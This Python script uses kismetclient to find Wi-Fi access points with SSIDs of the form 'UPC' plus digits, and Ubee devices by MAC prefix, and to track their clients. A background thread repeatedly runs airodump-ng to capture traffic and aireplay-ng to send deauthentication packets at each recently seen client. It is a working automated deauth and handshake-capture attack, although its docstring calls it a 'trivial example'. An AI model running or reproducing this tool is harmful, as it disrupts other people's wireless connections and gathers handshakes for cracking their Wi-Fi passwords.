#!/usr/bin/env python
"""
This is a trivial example of how to use kismetclient in an application.
"""
from kismetclient import Client as KismetClient
from kismetclient import handlers

from pprint import pprint
import subprocess
import re
import time
import Queue
import thread
import traceback
from sarge import run, Capture, Feeder

import logging
log = logging.getLogger('kismetclient')
log.addHandler(logging.StreamHandler())
log.setLevel(logging.WARN)

IFACE='wlan0mon'

address = ('127.0.0.1', 2501)
k = KismetClient(address)

# too verbose, disabling
#k.register_handler('TRACKINFO', handlers.print_fields)

last_channel = -1
upcs_ssid = {}
upcs_bssid = {}
upcs_clients = {}
ubees = {}

deauth_queue = Queue.PriorityQueue(500)


class UPCRec(object):
    INV_SIG = -9999

    def __init__(self, ssid=None, ssid_firsttime=None, ssid_lasttime=None, ssid_packets=None, ssid_beacons=None,
                 bssid=None, channel=None, firsttime=None, lasttime=None, packets=None,
                 beacons=None, llcpackets=None, datapackets=None, signal_dbm=None, signal_rssi=None,
                 clients=None):

        self.ssid = ssid
        self.ssid_firsttime = int(ssid_firsttime) if ssid_firsttime is not None else 0
        self.ssid_lasttime = int(ssid_lasttime) if ssid_lasttime is not None else 0
        self.ssid_packets = int(ssid_packets) if ssid_packets is not None else 0
        self.ssid_beacons = int(ssid_beacons) if ssid_beacons is not None else 0

        self.bssid = bssid
        self.channel = int(channel) if channel is not None else None
        self.firsttime = int(firsttime) if firsttime is not None else 0
        self.lasttime = int(lasttime) if lasttime is not None else 0
        self.packets = int(packets) if packets is not None else 0
        self.beacons = int(beacons) if beacons is not None else 0
        self.llcpackets = int(llcpackets) if llcpackets is not None else 0
        self.datapackets = int(datapackets) if datapackets is not None else 0
        self.signal_dbm = int(signal_dbm) if signal_dbm is not None else self.INV_SIG
        self.signal_rssi = int(signal_rssi) if signal_rssi is not None else self.INV_SIG
        self.clients = clients if clients is not None else {}
        pass

    def merge(self, rec):
        self.llcpackets += rec.llcpackets if rec.llcpackets > 0 else 0
        self.datapackets += rec.datapackets if rec.datapackets > 0 else 0
        if rec.channel is not None:
            self.channel = rec.channel
        if rec.signal_dbm != self.INV_SIG:
            self.signal_dbm = rec.signal_dbm
        if rec.signal_rssi != self.INV_SIG:
            self.signal_rssi = rec.signal_rssi

        self.ssid_packets += rec.ssid_packets if rec.ssid_packets > 0 else 0
        self.ssid_beacons += rec.ssid_beacons if rec.ssid_beacons > 0 else 0
        if self.ssid is None or len(self.ssid) == 0:
            self.ssid = rec.ssid
        if self.ssid_firsttime == 0:
            self.ssid_firsttime = rec.ssid_firsttime
        if self.ssid_lasttime == 0:
            self.ssid_lasttime = rec.ssid_lasttime

        if rec.lasttime > self.lasttime:
            self.lasttime = rec.lasttime
        if rec.ssid_lasttime > self.ssid_lasttime:
            self.ssid_lasttime = rec.ssid_lasttime

        if rec.clients is not None and len(rec.clients) > 0:
            for client_mac in rec.clients:
                if client_mac in self.clients:
                    self.clients[client_mac].merge(rec.clients[client_mac])
                else:
                    self.clients[client_mac] = rec.clients[client_mac]

    def is_ubee(self):
        return self.bssid.startswith('64:7C:34')


class Clientx(object):
    def __init__(self, bssid=None, mac=None, firsttime=None, lasttime=None, llcpackets=None,
                 datapackets=None, cryptpackets=None, signal_dbm=None, signal_rssi=None,
                 lastdeauth=None, deauthcnt=0):
        self.bssid = bssid
        self.mac = mac
        self.firsttime = int(firsttime) if firsttime is not None else 0
        self.lasttime = int(lasttime) if lasttime is not None else 0

        self.lastdeauth = int(lastdeauth) if lastdeauth is not None else 0
        self.deauthcnt = int(deauthcnt) if deauthcnt is not None else 0

        self.llcpackets = int(llcpackets) if llcpackets is not None else 0
        self.datapackets = int(datapackets) if datapackets is not None else 0
        self.cryptpackets = int(cryptpackets) if cryptpackets is not None else 0
        self.signal_dbm = int(signal_dbm) if firsttime is not None else -9999
        self.signal_rssi = int(signal_rssi) if firsttime is not None else -9999

    def merge(self, rec):
        if self.lasttime < rec.lasttime:
            self.lasttime = rec.lasttime
        if self.datapackets < rec.datapackets:
            self.datapackets = rec.datapackets
        if self.llcpackets < rec.llcpackets:
            self.llcpackets = rec.llcpackets
        if self.deauthcnt < rec.deauthcnt:
            self.deauthcnt = rec.deauthcnt
        if self.lastdeauth < rec.lastdeauth:
            self.lastdeauth = rec.lastdeauth


def get_time():
    return int(round(time.time()))


def update_ubee(rec):
    if rec.bssid not in ubees:
        ubees[rec.bssid] = rec
    else:
        ubees[rec.bssid].merge(rec)
    return ubees[rec.bssid]


def update_upc_ssid(rec):
    if rec.ssid not in upcs_ssid:
        upcs_ssid[rec.ssid] = rec
    else:
        upcs_ssid[rec.ssid].merge(rec)
    return upcs_ssid[rec.ssid]


def update_upc_bssid(rec):
    if rec.bssid not in upcs_bssid:
        upcs_bssid[rec.bssid] = rec
    else:
        upcs_bssid[rec.bssid].merge(rec)
    return upcs_bssid[rec.bssid]


def update_client(cl):
    if cl.mac not in upcs_clients:
        upcs_clients[cl.mac] = cl
    else:
        upcs_clients[cl.mac].merge(cl)
    return upcs_clients[cl.mac]


def deauth(bssid=None, client=None, channel=None, packets=0, state=None):
    client_arg = '-c %s' % client if client is not None else ''

    feeder = Feeder()
    cmd_dump = '/usr/sbin/airodump-ng --channel %d -w /home/dusan/deauth %s >/dev/null 2>/dev/null ' % (channel, IFACE)
    print '++++ cmd: %s' % cmd_dump

    p = run(cmd_dump, async=True)

    try:
        while len(p.commands) == 0:
            time.sleep(0.15)

        # if state['last'] != channel:
        #     cmd_airmon = 'iwconfig %s channel %s' % (IFACE, channel)
        #     print '++++ cmd: %s' % cmd_airmon
        #     p = subprocess.Popen(cmd_airmon, shell=True)
        #     p.communicate()
        #     state['last'] = channel

        cmd = '/usr/sbin/aireplay-ng -0 %d -D -a %s %s %s' % (packets, bssid, client_arg, IFACE)
        print '++++ cmd: %s' % cmd

        #time.sleep(3)
        #return 0

        p2 = subprocess.Popen(cmd, shell=True)
        p2.communicate()

        time.sleep(10)
        p.commands[0].terminate()
        time.sleep(1)
        p.commands[0].kill()

    except Exception as e:
        traceback.print_exc()
    finally:
        feeder.close()
        print '++++ END'
    pass


def deauth_thread():
    state = {'last': -1}

    while True:
        try:
            time.sleep(0.1)
            cl = deauth_queue.get(True, 10)[1]
            ctime = get_time()
            if ctime-cl.lasttime > 3*60:
                print "=== skipping %s %s" % (cl.bssid, cl.mac)
                continue

            if cl.bssid not in upcs_bssid:
                print "EEE %s %s not in db" % (cl.bssid, cl.mac)
                continue

            if cl.bssid == cl.mac:
                print "EEE SKIP"
                continue

            rec = upcs_bssid[cl.bssid]
            print('^^^ [%02d] ap: %s, cl: %s, channel: %s, lastseen: %s, lastdeauth: %s'
                  % (deauth_queue.qsize(), cl.bssid, cl.mac, rec.channel, cl.lasttime, cl.lastdeauth))
            deauth(cl.bssid, cl.mac, channel=rec.channel, packets=7, state=state)

        except Queue.Empty as e:
            continue


def handle_ssid(client, ssid, mac, firsttime, lasttime, packets, beacons):
    rec = UPCRec(ssid=ssid, bssid=mac, ssid_firsttime=firsttime, ssid_lasttime=lasttime, ssid_packets=packets, ssid_beacons=beacons)

    if mac.startswith('64:7C:34'):
        if mac not in ubees:
            print "!!UBEE"
        update_ubee(rec)

    match = re.match(r'UPC[0-9]+', ssid, re.I)
    if match:
        if ssid not in upcs_ssid:
            print "!!UPC"
        print 'ssid spotted: "%s" with mac %s, first: %s, last: %s, packets: %s, beacons: %s '\
              % (ssid, mac, firsttime, lasttime, packets, beacons)

        update_upc_bssid(rec)
        update_upc_ssid(rec)
        #client.cmd('ADDNETTAG', mac, '1', 'UPC', 'UPC')


def handle_bssid(client, bssid, type, firsttime, lasttime, llcpackets, datapackets, channel, signal_dbm, signal_rssi):
    rec = UPCRec(bssid=bssid, firsttime=firsttime, lasttime=lasttime, llcpackets=llcpackets, datapackets=datapackets,
                 channel=channel, signal_dbm=signal_dbm, signal_rssi=signal_rssi)

    if bssid in upcs_bssid:
        update_upc_bssid(rec)

        print 'bssid "%s" type %s, channel: %s,  first: %s, last: %s, llc: %s, data: %s ' \
              'signal dbm: %s, signal rssi: %s' \
          % (bssid, type, channel, firsttime, lasttime, llcpackets, datapackets, signal_dbm, signal_rssi)


def handle_client(client, bssid, mac, type, firsttime, lasttime, manuf, llcpackets, datapackets, cryptpackets,
                  signal_dbm, noise_dbm, minsignal_dbm, minnoise_dbm, maxsignal_dbm, maxnoise_dbm,
                  signal_rssi, noise_rssi, ip, gatewayip):

    if bssid in upcs_bssid:
        cl = Clientx(bssid=bssid, mac=mac, firsttime=firsttime, lasttime=lasttime, llcpackets=llcpackets,
                 datapackets=datapackets, cryptpackets=cryptpackets, signal_dbm=signal_dbm, signal_rssi=signal_rssi)
        rec = UPCRec(bssid=bssid, clients={mac: cl})

        rec2 = update_upc_bssid(rec)
        cl2 = update_client(cl)

        ctime = get_time()

        # lastseen - not older than 1 minute
        if ctime - cl2.lasttime > 60:
            return

        # last deauth - must be after 5 seconds
        if ctime - cl2.lastdeauth < 5:
            return

        try:
            deauth_queue.put_nowait((-1*cl2.lasttime, cl2))

            # update
            cl2.lastdeauth = ctime
        except Queue.Full as full:
            print 'Queue is full'

        print ' -- client bssid: %s, mac: %s, type: %s, ftime: %s, lasttime: %s, llc: %s, data: %s, ' \
              ' signal %s, rssi %s' % (bssid, mac, type, firsttime, lasttime, llcpackets, datapackets,
                                   signal_dbm, signal_rssi)


k.register_handler('SSID', handle_ssid)
k.register_handler('BSSID', handle_bssid)
k.register_handler('CLIENT', handle_client)

try:
    thread.start_new_thread( deauth_thread, ())
    while True:
        k.listen()
except KeyboardInterrupt:
    pprint(k.protocols)
    log.info('Exiting...')
